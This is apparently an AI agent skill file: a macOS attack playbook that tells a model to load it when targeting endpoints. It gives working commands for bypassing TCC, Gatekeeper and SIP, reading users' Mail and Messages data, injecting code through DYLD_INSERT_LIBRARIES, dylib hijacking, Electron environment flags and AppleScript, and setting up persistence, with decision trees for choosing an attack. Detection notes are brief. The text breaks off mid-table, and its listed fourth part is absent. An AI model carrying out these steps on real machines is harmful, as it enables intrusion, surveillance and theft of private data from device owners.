---
name: macos-all
description: >-
  macOS security complete playbook. Covers TCC bypass (CVE-2023-32364 SQL injection/MacDirtyCow/entitlement inheritance), Gatekeeper bypass (quarantine xattr/notarization), SIP bypass, process injection (DYLD_INSERT_LIBRARIES/ELECTRON_RUN_AS_NODE/XPC PID reuse/Electron fuses), and dylib hijacking techniques. Load when targeting macOS endpoints.
---

# macOS Security — Complete Playbook

## Internal Navigation
| Part | Content |
|---|---|
| 1 | macOS Security Bypass |
| 2 | TCC Bypass Matrix |
| 3 | Process Injection |
| 4 | Dylib & XPC Techniques |

---
# Part 1: macOS Security Bypass


# SKILL: macOS Security Bypass — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert macOS security bypass techniques. Covers TCC bypass, Gatekeeper evasion, SIP restrictions, sandbox escape, and entitlement abuse. Base models miss version-specific bypass nuances and protection interaction effects.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [macos-process-injection](../macos-process-injection/SKILL.md) when you need dylib injection, XPC exploitation, or Electron abuse after achieving initial access
- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) for Unix-layer privesc techniques that also apply to macOS (SUID, cron, writable paths)
- [linux-security-bypass](../linux-security-bypass/SKILL.md) for shared Unix security bypass concepts

### Advanced Reference

Also load [TCC_BYPASS_MATRIX.md](./TCC_BYPASS_MATRIX.md) when you need:
- Per-macOS-version TCC bypass mapping
- Protection-type-specific techniques (Camera, Microphone, FDA, Automation)
- MDM/configuration profile abuse patterns


## 1. TCC (TRANSPARENCY, CONSENT, CONTROL) OVERVIEW

TCC is macOS's permission framework controlling access to sensitive resources (camera, microphone, contacts, full disk access, etc.).

### 1.1 TCC Database Locations

| Database | Path | Controls | Protection |
|---|---|---|---|
| User-level | `~/Library/Application Support/com.apple.TCC/TCC.db` | Per-user consent decisions | SIP-protected since Catalina |
| System-level | `/Library/Application Support/com.apple.TCC/TCC.db` | System-wide consent decisions | SIP-protected |
| MDM-managed | Via configuration profiles | Push PPPC (Privacy Preferences Policy Control) | Device management |

```sql
-- Query TCC database (requires FDA or SIP off)
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT service, client, allowed FROM access;"
```

### 1.2 TCC Bypass Categories

| Category | Mechanism | Typical Prerequisite |
|---|---|---|
| FDA app exploitation | Piggyback on apps already granted Full Disk Access | Write access to FDA app's bundle or plugin dir |
| Direct DB modification | Edit TCC.db to grant consent | SIP disabled or FDA |
| Inherited permissions | Child process inherits parent's TCC grants | Code execution in context of FDA-granted app |
| Automation abuse | Apple Events / osascript to control TCC-granted app | Automation permission (lower bar than direct TCC) |
| Mounting tricks | Mount a crafted disk image containing modified TCC.db | Local access, pre-Ventura |
| SQL injection in TCC | Malformed bundle IDs triggering SQL injection in TCC subsystem | CVE-2023-32364 and similar |

### 1.3 Known TCC Bypass Patterns

**Terminal / iTerm FDA inheritance**: Terminal.app granted FDA → any command run inherits FDA → read any file.

```bash
# If Terminal has FDA, this reads protected files directly
cat ~/Library/Mail/V*/MailData/Envelope\ Index
cat ~/Library/Messages/chat.db
```

**Finder automation**: Automate Finder (lower permission bar) to access files in protected locations.

```applescript
tell application "Finder"
  set f to POSIX file "/Users/target/Library/Mail/V9/MailData/Envelope Index"
  duplicate f to desktop
end tell
```

**System Preferences / System Settings injection**: Inject into a process that already has TCC permissions by writing to its Application Scripts folder.

**MDM profile abuse**: PPPC profiles can pre-approve TCC permissions. Rogue MDM enrollment or compromised MDM server → push PPPC payload.

---

## 2. GATEKEEPER BYPASS

Gatekeeper blocks unsigned or unnotarized apps from executing. Core enforcement depends on the `com.apple.quarantine` extended attribute.

### 2.1 Quarantine Attribute Removal

```bash
# Check quarantine attribute
xattr -l /path/to/app
# Output: com.apple.quarantine: 0083;...

# Remove quarantine (requires write access)
xattr -d com.apple.quarantine /path/to/app
# Recursive for app bundles
xattr -rd com.apple.quarantine /path/to/MyApp.app
```

### 2.2 Bypass Techniques

| Technique | How It Works | macOS Version |
|---|---|---|
| `xattr -d` removal | Remove quarantine before execution | All (requires local access) |
| App translocation bypass | Apps in certain locations skip translocation | Pre-Catalina |
| Archive tools that strip quarantine | Some unarchiver apps don't propagate quarantine | Varies by tool |
| Unsigned code in signed bundle | Notarized app bundles with unsigned nested helpers | Pre-Ventura (CVE-2022-42821) |
| Safari auto-extract + open | Downloaded ZIP auto-extracted, app opened before quarantine fully applied | Safari-specific, patched |
| ACL abuse | `com.apple.quarantine` can be blocked by ACLs set before download | Requires pre-positioning |
| Disk image (DMG) tricks | DMG mounted from network share may not carry quarantine | Network share context |
| BOM (Bill of Materials) bypass | Crafted BOM in pkg skips quarantine for extracted files | CVE-2022-22616 |

### 2.3 Gatekeeper Check Flow

```
App launched
│
├── com.apple.quarantine attribute present?
│   ├── No → execute (no Gatekeeper check)
│   └── Yes ↓
│
├── Code signature valid?
│   ├── No → block
│   └── Yes ↓
│
├── Notarized (stapled ticket or online check)?
│   ├── No → block (Catalina+)
│   └── Yes → execute
│
└── User override? (right-click → Open → confirm)
    └── Bypasses Gatekeeper once for this app
```

---

## 3. SIP (SYSTEM INTEGRITY PROTECTION)

SIP restricts root from modifying protected system locations, loading unsigned kernel extensions, and debugging system processes.

### 3.1 SIP-Protected Locations

```
/System/
/usr/ (except /usr/local/)
/bin/
/sbin/
/var/ (selected subdirs)
/Applications/ (pre-installed Apple apps)
```

### 3.2 SIP Status & Configuration

```bash
csrutil status              # Check SIP status
csrutil disable             # Recovery Mode only
csrutil enable --without fs # Partial disable (risky)
```

### 3.3 Entitlements That Bypass SIP

| Entitlement | Effect |
|---|---|
| `com.apple.rootless.install` | Write to SIP-protected paths |
| `com.apple.rootless.install.heritable` | Child processes inherit SIP bypass |
| `com.apple.security.cs.allow-unsigned-executable-memory` | JIT/unsigned code in memory |
| `com.apple.private.security.clear-library-validation` | Load unsigned libraries |

### 3.4 Historical SIP Bypasses

| CVE | macOS | Technique |
|---|---|---|
| CVE-2021-30892 (Shrootless) | Monterey pre-12.0.1 | `system_installd` + post-install script in signed pkg |
| CVE-2022-22583 | Monterey pre-12.2 | `packagekit` + mount point manipulation |
| CVE-2022-46689 (MacDirtyCow) | Ventura pre-13.1 | Race condition on copy-on-write, overwrite SIP files |
| CVE-2023-32369 (Migraine) | Ventura pre-13.4 | Migration Assistant TCC/SIP bypass via systemmigrationd |
| CVE-2024-44243 | Sequoia pre-15.2 | StorageKit daemon exploitation |

---

## 4. SANDBOX ESCAPE

macOS sandboxing (App Sandbox, via `sandbox-exec` or entitlements) restricts app access to filesystem, network, and IPC.

### 4.1 Office Sandbox Escape Patterns

| Vector | Description |
|---|---|
| Open/Save dialog abuse | User grants file access via dialog → macro reads/writes beyond sandbox |
| `~/Library/LaunchAgents/` persistence | Some sandbox profiles allow writing LaunchAgent plists |
| Login Items manipulation | Add login item pointing to payload outside sandbox |
| Shared container exploitation | Multiple apps sharing the same App Group container |

### 4.2 IPC-Based Escape

| IPC Mechanism | Escape Vector |
|---|---|
| XPC Services | Connect to privileged XPC service with insufficient client validation |
| Mach Ports | Obtain send right to privileged task port |
| Apple Events | Automate unsandboxed app to perform actions |
| Distributed Notifications | Signal unsandboxed helper to execute payload |
| Pasteboard | Write payload to pasteboard, have unsandboxed app consume it |

### 4.3 Browser Sandbox

- Chromium: Multi-process model, renderer is sandboxed, browser process is not
- Safari: WebContent process sandboxed, parent Safari process has more privileges
- Exploit chain: renderer RCE → sandbox escape (via IPC bug to browser process) → system access

---

## 5. CODE SIGNING & ENTITLEMENTS

### 5.1 Inspecting Signatures and Entitlements

```bash
codesign -dv --verbose=4 /path/to/app       # Signature details
codesign -d --entitlements :- /path/to/app   # Dump entitlements
security cms -D -i /path/to/mobileprovision  # Provisioning profile

# Verify signature validity
codesign --verify --deep --strict /path/to/app
spctl --assess --type execute /path/to/app   # Gatekeeper assessment
```

### 5.2 Entitlement Abuse for Privilege Escalation

| Entitlement | Abuse Scenario |
|---|---|
| `com.apple.security.cs.disable-library-validation` | Load attacker dylib into entitled process |
| `com.apple.security.cs.allow-dyld-environment-variables` | DYLD_INSERT_LIBRARIES injection |
| `com.apple.security.get-task-allow` | Attach debugger, inject code |
| `com.apple.security.cs.debugger` | Debug any process |
| `com.apple.private.apfs.revert-to-snapshot` | Revert APFS snapshots, bypass modifications |

### 5.3 Hardened Runtime Bypass

Hardened Runtime prevents: DYLD env vars, debugging, unsigned memory execution. Bypasses:
- Find entitled apps that weaken Hardened Runtime (`disable-library-validation`)
- Exploit JIT-entitled apps (browsers, VMs) for unsigned code execution
- Use `get-task-allow` entitled debug builds left in production

### 5.4 Library Validation Bypass

Library validation ensures only Apple-signed or same-team-signed dylibs load.

```bash
# Find apps with library validation disabled
codesign -d --entitlements :- /Applications/*.app/Contents/MacOS/* 2>/dev/null | \
  grep -l "disable-library-validation"
```

---

## 6. PERSISTENCE AFTER BYPASS

| Method | Location | Survives Reboot | Notes |
|---|---|---|---|
| LaunchAgent | `~/Library/LaunchAgents/` | Yes | User-level, runs at login |
| LaunchDaemon | `/Library/LaunchDaemons/` | Yes | Root-level, runs at boot |
| Login Items | `~/Library/Application Support/com.apple.backgroundtaskmanagementagent/` | Yes | Visible in System Settings |
| Cron | `crontab -e` | Yes | Often overlooked by defenders |
| Dylib hijack | Writable dylib search path | Yes | Triggered when target app launches |
| Folder Action | `~/Library/Scripts/Folder Action Scripts/` | Yes | Triggers on folder events |

---

## 7. macOS SECURITY BYPASS DECISION TREE

```
Target is macOS endpoint
│
├── Need to execute untrusted binary?
│   ├── Quarantine attribute present?
│   │   ├── Yes → xattr -d com.apple.quarantine (§2.1)
│   │   └── No → execute directly
│   └── Gatekeeper still blocks?
│       ├── Signed but not notarized → right-click → Open override
│       └── Unsigned → embed in signed bundle or use archive tricks (§2.2)
│
├── Need access to TCC-protected resources?
│   ├── FDA-granted app available?
│   │   ├── Yes → exploit FDA app context (§1.3)
│   │   └── No ↓
│   ├── Automation permission obtainable?
│   │   ├── Yes → Apple Events to TCC-granted app (§1.3)
│   │   └── No ↓
│   ├── SIP disabled?
│   │   ├── Yes → direct TCC.db modification (§1.2)
│   │   └── No → check version-specific TCC bypass (→ TCC_BYPASS_MATRIX.md)
│   └── MDM present?
│       └── Compromised MDM → push PPPC profile (§1.3)
│
├── Need to bypass SIP?
│   ├── Check macOS version → historical SIP CVE? (§3.4)
│   ├── Find entitled Apple binary → piggyback SIP-bypass entitlement (§3.3)
│   └── Recovery Mode access? → csrutil disable (§3.2)
│
├── Need sandbox escape?
│   ├── Office macro context → dialog/LaunchAgent tricks (§4.1)
│   ├── XPC service with weak validation → IPC escape (§4.2)
│   └── Browser context → renderer → sandbox escape chain (§4.3)
│
├── Need to inject into signed process?
│   ├── disable-library-validation entitlement? → dylib injection
│   ├── allow-dyld-environment-variables? → DYLD_INSERT_LIBRARIES
│   ├── get-task-allow? → debugger attach
│   └── None → check macos-process-injection SKILL.md
│
└── Need persistence?
    └── Choose method by access level (§6)
```

---

## 8. QUICK REFERENCE: TOOL COMMANDS

```bash
# Enumerate TCC permissions
tccutil reset All                              # Reset all TCC (admin)
sqlite3 TCC.db "SELECT * FROM access;"         # Read TCC DB

# Gatekeeper status
spctl --status                                 # Gatekeeper enabled?
spctl --assess -v /path/to/app                 # Check app assessment

# SIP status
csrutil status

# Find interesting entitlements across system
find /System/Applications /Applications -name "*.app" -exec sh -c \
  'codesign -d --entitlements :- "$1" 2>/dev/null | grep -q "disable-library-validation" && echo "$1"' _ {} \;

# List loaded kexts (kernel extensions)
kextstat | grep -v com.apple

# Sandbox profile inspection
sandbox-exec -p "(version 1)(allow default)" /bin/ls  # Test sandbox rules
```


---
# Part 2: TCC Bypass Matrix


## 1. TCC BYPASS BY macOS VERSION

### 1.1 Mojave (10.14)

| CVE / Technique | Bypassed Protection | Method |
|---|---|---|
| SSH TCC bypass | FDA | SSH into localhost inherits FDA of Terminal |
| Finder scripting | File access | AppleScript controls Finder without TCC prompt |
| Direct TCC.db edit | All | User TCC.db modifiable without SIP restriction |
| `tccutil` manipulation | All | Programmatic TCC reset and grant |

### 1.2 Catalina (10.15)

| CVE / Technique | Bypassed Protection | Method |
|---|---|---|
| TCC.db moved under SIP | — | Direct edit now blocked (defense improvement) |
| Mount trick | FDA | Mount disk image with crafted TCC.db over user's |
| Environment variable injection | Varies | Inject into entitled processes via env vars |
| CVE-2020-9934 | All | TCC.db race condition during profile migration |
| Inetloc file handler | Automation | `.inetloc` file triggers app without quarantine check |

### 1.3 Big Sur (11.x)

| CVE / Technique | Bypassed Protection | Method |
|---|---|---|
| CVE-2021-30713 | All | XCSSET malware: forge synthetic clicks via `screencapture` |
| CVE-2021-30970 | FDA | `com.apple.systempreferences` injection via scripts dir |
| Accessibility API abuse | Accessibility | Entitled process → inject into Accessibility-granted app |
| Signed System Volume (SSV) | — | Volume seal limits modification (defense improvement) |

### 1.4 Monterey (12.x)

| CVE / Technique | Bypassed Protection | Method |
|---|---|---|
| CVE-2022-22583 | FDA | `PackageKit` framework exploitation |
| CVE-2021-30892 (Shrootless) | SIP + TCC | `system_installd` post-install script in signed pkg |
| CVE-2022-32900 | Automation | Shortcut app can be abused for automation without consent |
| Python/Perl TCC inheritance | FDA | Script interpreters inherit calling app's TCC |
| Background Task Management Agent | Persistence | New `BTM` visibility (defense improvement) |

### 1.5 Ventura (13.x)

| CVE / Technique | Bypassed Protection | Method |
|---|---|---|
| CVE-2023-32369 (Migraine) | SIP + TCC | `systemmigrationd` abuse during Migration Assistant |
| CVE-2023-32364 | FDA | SQL injection in TCC subsystem via crafted bundle ID |
| CVE-2023-38571 | FDA | Archive Utility bypass — files extracted without quarantine |
| CVE-2022-46689 (MacDirtyCow) | All | COW race condition to overwrite SIP-protected TCC.db |
| Login Items notification | — | Users notified of new Login Items (defense improvement) |

### 1.6 Sonoma (14.x)

| CVE / Technique | Bypassed Protection | Method |
|---|---|---|
| CVE-2024-44133 (HM Surf) | Camera, Mic, Location | Safari TCC bypass via `dscl` user home dir manipulation |
| CVE-2024-44131 | FDA | `FileProvider` symlink race condition |
| Third-party app FDA exploitation | FDA | Piggyback on third-party app's pre-existing FDA grant |
| App Management protection | — | New protection for app modification (defense improvement) |

### 1.7 Sequoia (15.x)

| CVE / Technique | Bypassed Protection | Method |
|---|---|---|
| CVE-2024-44243 | SIP + TCC | StorageKit daemon exploitation for SIP bypass |
| CVE-2025-24086 | FDA | CoreMedia framework exploitation |
| Consent prompt for screen recording | — | Weekly re-consent for screen recording (defense improvement) |
| Network extension prompt changes | — | Tighter notification for network extensions |


## 2. TCC BYPASS BY PROTECTION TYPE

### 2.1 Camera & Microphone

| Technique | Requirements | Notes |
|---|---|---|
| Exploit Camera-granted app | Code execution in granted app | Zoom, Teams, FaceTime all have Camera TCC |
| Safari HM Surf (CVE-2024-44133) | Safari-specific bypass | Manipulate user home directory config |
| XPC to VDCAssistant/coreaudiod | Privileged IPC | Camera/audio daemons |
| Virtual camera/mic injection | Kernel extension or DriverKit | Inject virtual device at driver level |

### 2.2 Full Disk Access (FDA)

| Technique | Requirements | Notes |
|---|---|---|
| Terminal/iTerm inheritance | Terminal app has FDA | All child processes inherit FDA |
| Backup software exploitation | Backup apps (CCC, Time Machine) granted FDA | Common in enterprise |
| MDM agent exploitation | MDM agent with FDA | Jamf, Mosyle, Kandji, etc. |
| SSH localhost | FDA-granted Terminal + SSH enabled | SSH session inherits FDA |
| Script interpreter inheritance | Python/Ruby/Perl run from FDA context | Interpreter inherits grants |

### 2.3 Automation (Apple Events)

| Technique | Requirements | Notes |
|---|---|---|
| osascript to Finder | Automation→Finder permission (lower bar) | Move, copy, read files via Finder |
| System Events scripting | Automation→System Events | UI scripting, keystroke injection |
| Terminal `do script` | Automation→Terminal | Run commands in Terminal context |
| Calendar alert exploit | Calendar event with alert action | Execute script on trigger |

### 2.4 Location Services

| Technique | Requirements | Notes |
|---|---|---|
| CoreLocation via entitled app | Exploit app with Location permission | Weather, Maps |
| Wi-Fi SSID for location inference | Network access (no TCC required) | Correlate SSID with location databases |

### 2.5 Screen Recording / Screen Capture

| Technique | Requirements | Notes |
|---|---|---|
| `screencapture` via entitled process | Exploit process with Screen Recording TCC | Zoom, Teams desktop agents |
| CGWindowListCreateImage without TCC | Pre-Catalina only | API deprecated for privacy |
| Window server exploitation | Privileged access | `WindowServer` process has inherent screen access |

---

## 3. MDM / PPPC PROFILE ABUSE

### 3.1 PPPC (Privacy Preferences Policy Control) Profiles

MDM-managed devices can push PPPC profiles that pre-approve TCC permissions without user consent.

```xml
<!-- Example PPPC payload granting FDA to a bundle -->
<dict>
  <key>Authorization</key>
  <string>AllowStandardUserToSetSystemService</string>
  <key>CodeRequirement</key>
  <string>identifier "com.attacker.tool" and anchor apple generic</string>
  <key>IdentifierType</key>
  <string>bundleID</string>
  <key>Identifier</key>
  <string>com.attacker.tool</string>
  <key>Services</key>
  <dict>
    <key>SystemPolicyAllFiles</key>
    <dict>
      <key>Authorization</key>
      <string>Allow</string>
    </dict>
  </dict>
</dict>
```

### 3.2 Attack Vectors

| Vector | Description |
|---|---|
| Rogue MDM enrollment | Social engineering user to enroll in attacker-controlled MDM |
| Compromised MDM server | Exploit Jamf Pro, Mosyle, Kandji, etc. to push malicious profiles |
| Profile injection via local admin | `profiles install -path /path/to/profile.mobileconfig` (requires admin or MDM) |
| Inherited enrollment | Device sold/transferred with MDM enrollment still active |

---

## 4. TCC INSPECTION & RECONNAISSANCE

```bash
# List all TCC databases accessible
find / -name "TCC.db" 2>/dev/null

# Dump user TCC (requires FDA or SIP off)
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT service, client, client_type, auth_value, auth_reason FROM access;"

# auth_value meanings
# 0 = denied, 1 = unknown, 2 = allowed, 3 = limited

# List apps with specific TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# Check effective TCC for a running process
# (no direct API — must infer from TCC.db + entitlements + code signature)

# Enumerate entitlements of all running processes
ps -eo pid,comm | while read pid comm; do
  codesign -d --entitlements :- "$comm" 2>/dev/null
done
```

---

## 5. DEFENSE & DETECTION

| Indicator | Detection Method |
|---|---|
| TCC.db access from unexpected process | Endpoint telemetry (ES_EVENT_TYPE_NOTIFY_OPEN on TCC.db) |
| `xattr -d` on quarantine | File integrity monitoring |
| AppleScript to sensitive apps | Audit Apple Events via Endpoint Security |
| New LaunchAgents/LaunchDaemons | Monitor `~/Library/LaunchAgents/` and `/Library/LaunchDaemons/` |
| MDM profile installation | Alert on unexpected profile additions |
| `csrutil disable` | Monitor SIP status changes at boot |


---
# Part 3: Process Injection


# SKILL: macOS Process Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert macOS process injection techniques. Covers DYLD_INSERT_LIBRARIES, dylib hijacking (weak/rpath/proxy), XPC PID reuse attacks, Mach port manipulation, MIG abuse, and Electron injection. Base models miss entitlement prerequisites and SIP constraints on injection vectors.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [macos-security-bypass](../macos-security-bypass/SKILL.md) when you need to bypass TCC, Gatekeeper, or SIP protections blocking your injection
- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) for Unix-layer escalation (shared object hijacking concepts apply)

### Advanced Reference

Also load [DYLIB_XPC_TECHNIQUES.md](./DYLIB_XPC_TECHNIQUES.md) when you need:
- Step-by-step dylib hijacking methodology with tooling commands
- XPC exploitation walkthrough with code examples
- Mach port technique details and task_for_pid patterns


## 1. DYLD_INSERT_LIBRARIES INJECTION

The most straightforward injection: set an environment variable that forces the dynamic linker to preload your dylib.

### 1.1 Requirements and Restrictions

| Condition | Can Inject? | Reason |
|---|---|---|
| Normal (non-hardened) binary | Yes | No restrictions |
| Hardened Runtime enabled | No | DYLD strips env vars |
| Hardened Runtime + `com.apple.security.cs.allow-dyld-environment-variables` | Yes | Entitlement explicitly allows it |
| Apple system binary (SIP-protected) | No | DYLD env vars stripped by SIP |
| SUID/SGID binary | No | DYLD env vars stripped for privilege safety |
| App Sandbox enabled | No | Sandbox blocks env var injection |

### 1.2 Basic Injection

```bash
# Create malicious dylib
cat > inject.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void inject() {
    printf("[+] Injected into PID %d\n", getpid());
    // payload here
}
EOF

# Compile for both architectures
gcc -dynamiclib -o inject.dylib inject.c -arch x86_64 -arch arm64

# Inject into target
DYLD_INSERT_LIBRARIES=./inject.dylib /path/to/target
```

### 1.3 Finding Injectable Targets

```bash
# Find apps WITHOUT hardened runtime
find /Applications -name "*.app" -exec sh -c '
  binary=$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)
  if [ -n "$binary" ]; then
    flags=$(codesign -d --verbose "$1/Contents/MacOS/$binary" 2>&1)
    echo "$flags" | grep -q "runtime" || echo "No Hardened Runtime: $1"
  fi
' _ {} \;

# Find apps with dyld env var entitlement
find /Applications -name "*.app" -exec sh -c '
  binary="$1/Contents/MacOS/"$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)
  codesign -d --entitlements :- "$binary" 2>/dev/null | \
    grep -q "allow-dyld-environment-variables" && echo "DYLD injectable: $1"
' _ {} \;
```

---

## 2. DYLIB HIJACKING

Exploit the dynamic linker's library search order to load attacker-controlled dylibs instead of (or in addition to) legitimate ones.

### 2.1 Weak Dylib Hijacking (LC_LOAD_WEAK_DYLIB)

Weak dylibs are optional — if missing, the binary still runs. If you can place a dylib at the expected path, it loads.

```bash
# Find binaries with weak dylib references
otool -l /path/to/binary | grep -A 2 LC_LOAD_WEAK_DYLIB

# Check if the weak dylib actually exists
otool -L /path/to/binary | grep weak | while read lib rest; do
  [ ! -f "$lib" ] && echo "MISSING (hijackable): $lib"
done
```

### 2.2 @rpath Hijacking

`@rpath` is resolved from `LC_RPATH` entries in the binary. If an earlier rpath directory is writable, you can place your dylib there.

```bash
# List rpath entries
otool -l /path/to/binary | grep -A 2 LC_RPATH

# List rpath-relative dylib references
otool -L /path/to/binary | grep @rpath

# If rpath includes writable directory (e.g., app's Frameworks/)
# place malicious dylib with matching name there
```

### 2.3 Dylib Proxying

Replace a legitimate dylib with a malicious one that forwards all exports to the original.

```bash
# Step 1: Identify target dylib and its exports
nm -gU /path/to/original.dylib | awk '{print $3}'

# Step 2: Create proxy dylib that re-exports everything
# Move original to original_real.dylib
# Create proxy:
cat > proxy.c << 'EOF'
__attribute__((constructor))
void payload() {
    // malicious code here
}
EOF

gcc -dynamiclib -o hijacked.dylib proxy.c \
  -Wl,-reexport_library,/path/to/original_real.dylib \
  -arch x86_64 -arch arm64
```

### 2.4 Dependency Enumeration

```bash
otool -L /path/to/binary              # List all dylib dependencies
otool -l /path/to/binary              # Full load commands (rpaths, weak, etc.)
dyldinfo -print_dependencies /path/to/binary  # Detailed dependency info (pre-Ventura)
```

---

## 3. XPC EXPLOITATION

XPC (Cross-Process Communication) is macOS's primary IPC mechanism for privilege separation. Privileged XPC services are high-value targets.

### 3.1 XPC Service Discovery

```bash
# System XPC services
find /System/Library -name "*.xpc" -type d 2>/dev/null | head -20

# Third-party XPC services
find /Library /Applications -name "*.xpc" -type d 2>/dev/null

# LaunchDaemon XPC services (root-level)
grep -r "MachServices" /Library/LaunchDaemons/*.plist 2>/dev/null
grep -r "MachServices" /System/Library/LaunchDaemons/*.plist 2>/dev/null
```

### 3.2 PID Reuse Attack

XPC connections validated by PID are vulnerable to race conditions: attacker spawns process, PID is checked and passes, attacker's process exits, OS reuses PID for malicious process.

| Validation Method | Vulnerable? | Notes |
|---|---|---|
| PID-based check | Yes | PID recycled after process exit |
| Audit token | No | Unique per process lifecycle, not recycled |
| Code signature check | No | Validates signing identity |
| Entitlement check | No | Checks process entitlements |

```
Timeline of PID reuse attack:
1. Legitimate client (PID 1234) connects to XPC service
2. XPC service checks PID 1234 → valid
3. Legitimate client exits (PID 1234 freed)
4. Attacker rapidly forks to get PID 1234
5. Attacker's process (now PID 1234) sends malicious XPC message
6. XPC service trusts PID 1234 (cached validation)
```

### 3.3 XPC Client Validation Weaknesses

| Weakness | Description | Exploitation |
|---|---|---|
| No client validation | Service accepts any connection | Connect directly, send commands |
| PID-only validation | Race condition exploitable | PID reuse attack (§3.2) |
| Bundle ID check only | Bundle IDs can be spoofed | Create app with matching bundle ID |
| Partial code requirement | Missing anchor checks | Sign with any cert matching partial requirement |
| Entitlement check on wrong process | Checks parent instead of client | Spawn from entitled parent |

---

## 4. MACH PORT MANIPULATION

Mach ports are the kernel-level IPC primitive underlying XPC. Direct Mach port access enables powerful injection.

### 4.1 Task Port (task_for_pid)

```c
// Requires root or taskgated entitlement
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);
if (kr == KERN_SUCCESS) {
    // Can now read/write target process memory
    // Can inject threads via thread_create_running
}
```

| Access Method | Requirement | Post-Exploit Capability |
|---|---|---|
| `task_for_pid()` | Root + not SIP-protected target | Full memory R/W, thread injection |
| `processor_set_tasks()` | Root + `com.apple.system-task-ports` | Enumerate all task ports |
| Exception ports | Set via `task_set_exception_ports` | Catch target crashes, redirect execution |
| Thread injection | Task port obtained | Create new thread in target address space |

### 4.2 Port Namespace Manipulation

| Technique | Description |
|---|---|
| Port name guessing | Mach port names are sequential integers — brute-forceable in some contexts |
| `mach_port_insert_right` | Insert send right into target's namespace (requires task port) |
| Bootstrap server abuse | Register service name before legitimate service → intercept connections |

---

## 5. MIG (MACH INTERFACE GENERATOR) ABUSE

MIG generates C stubs for Mach IPC. MIG servers may have vulnerabilities in their dispatch routines.

### 5.1 Analysis Approach

```bash
# Find MIG subsystems in a binary
nm /path/to/binary | grep _subsystem
strings /path/to/binary | grep "MIG"

# Identify MIG routine dispatch tables
otool -tV /path/to/binary | grep -A 5 "server_routine"
```

### 5.2 Common MIG Vulnerabilities

| Vulnerability | Description |
|---|---|
| Missing audit token validation | MIG handler doesn't verify sender identity |
| Type confusion | MIG deserialization trusts client-provided type descriptors |
| Port lifecycle issues | Use-after-deallocate on Mach ports between MIG calls |
| OOL (out-of-line) memory abuse | Oversized OOL descriptors → kernel memory issues |

---

## 6. ELECTRON / CHROMIUM INJECTION

Many macOS apps use Electron (Slack, Discord, VS Code, Teams, etc.). Electron apps expose multiple injection surfaces.

### 6.1 ELECTRON_RUN_AS_NODE

```bash
# Turns Electron app into a plain Node.js runtime
ELECTRON_RUN_AS_NODE=1 "/Applications/Slack.app/Contents/MacOS/Slack" -e \
  "require('child_process').execSync('id').toString()"

# This inherits the app's TCC permissions!
# If Slack has camera/mic/screen recording, your code gets it too.
```

### 6.2 Debugging Flags

```bash
# Open Chrome DevTools protocol on the app
"/Applications/Target.app/Contents/MacOS/Target" --inspect=9229
# Then connect: chrome://inspect in Chrome browser

# Break before any code runs
"/Applications/Target.app/Contents/MacOS/Target" --inspect-brk=9229
```

### 6.3 NODE_OPTIONS Injection

```bash
# Inject preload script via NODE_OPTIONS
echo 'require("child_process").execSync("id > /tmp/pwned")' > /tmp/preload.js
NODE_OPTIONS="--require /tmp/preload.js" "/Applications/Target.app/Contents/MacOS/Target"
```

### 6.4 Electron Fuses

Modern Electron apps use "fuses" to disable dangerous features. Check fuse state:

| Fuse | When Enabled (secure) | When Disabled (exploitable) |
|---|---|---|
| `RunAsNode` | ELECTRON_RUN_AS_NODE stripped | Can use app as Node.js |
| `EnableNodeCliInspectArguments` | --inspect flags stripped | Can attach debugger |
| `EnableNodeOptionsEnvironmentVariable` | NODE_OPTIONS stripped | Can inject preload |
| `OnlyLoadAppFromAsar` | Only loads from .asar | Can replace JS files |

```bash
# Check electron fuse status (requires npx @electron/fuses)
npx @electron/fuses read --app "/Applications/Target.app"
```

---

## 7. APPLICATION SCRIPTING (APPLE EVENTS)

```bash
# Inject via osascript (if Automation permission exists)
osascript -e 'tell application "Terminal" to do script "id > /tmp/pwned"'

# JavaScript for Automation (JXA)
osascript -l JavaScript -e '
  var app = Application("Terminal");
  app.doScript("id > /tmp/pwned");
'

# JXA with ObjC bridge (powerful)
osascript -l JavaScript -e '
  ObjC.import("Cocoa");
  var task = $.NSTask.alloc.init;
  task.launchPath = "/bin/bash";
  task.arguments = ["-c", "id > /tmp/pwned"];
  task.launch;
'
```

---

## 8. PROCESS INJECTION DECISION TREE

```
Need to inject code into macOS process
│
├── Target uses Electron?
│   ├── Fuses disabled? → ELECTRON_RUN_AS_NODE (§6.1)
│   ├── Debugging available? → --inspect flag (§6.2)
│   ├── NODE_OPTIONS not stripped? → preload injection (§6.3)
│   └── All fuses on? → check dylib path or XPC
│
├── Target has dylib env var entitlement?
│   └── Yes → DYLD_INSERT_LIBRARIES (§1)
│
├── Target has missing or weak dylib?
│   ├── LC_LOAD_WEAK_DYLIB with missing lib? → place dylib (§2.1)
│   ├── @rpath with writable dir first in search? → rpath hijack (§2.2)
│   └── Existing dylib in writable location? → dylib proxy (§2.3)
│
├── Target exposes XPC service?
│   ├── No client validation? → connect directly (§3.3)
│   ├── PID-only validation? → PID reuse attack (§3.2)
│   └── Audit token validation? → need different vector
│
├── Have root access?
│   ├── Target not SIP-protected? → task_for_pid injection (§4.1)
│   └── SIP-protected? → need SIP bypass first (→ macos-security-bypass)
│
├── Can use Apple Events?
│   ├── Automation permission for target? → osascript injection (§7)
│   └── No permission? → social engineer Automation consent
│
└── None of the above?
    ├── Check for MIG server vulnerabilities (§5)
    └── Look for bootstrap server name collision (§4.2)
```

---

## 9. DETECTION & FORENSICS

| Artifact | Where to Look |
|---|---|
| DYLD_INSERT_LIBRARIES use | Process environment (`/proc/PID/environ`, `ps eww`) |
